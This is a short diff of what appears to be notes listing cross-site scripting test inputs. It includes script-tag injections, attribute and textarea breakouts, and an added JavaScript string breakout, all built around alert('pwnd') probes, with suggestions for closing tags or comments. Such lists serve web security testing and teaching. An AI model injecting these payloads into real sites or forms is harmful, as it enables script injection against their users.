@@ -10,4 +10,6 @@ examples:
     <script>alert('pwnd');</script>
     "><script>---SNIP---
     </textarea><script>---SNIP---
-        more elegant maybe: </textarea><script>alert('pwnd');</script><textarea>
+        more elegant maybe?: </textarea><script>alert('pwnd');</script><textarea>
+    ';alert('pwnd');//
+        or maybe append with?: </script> or <!--
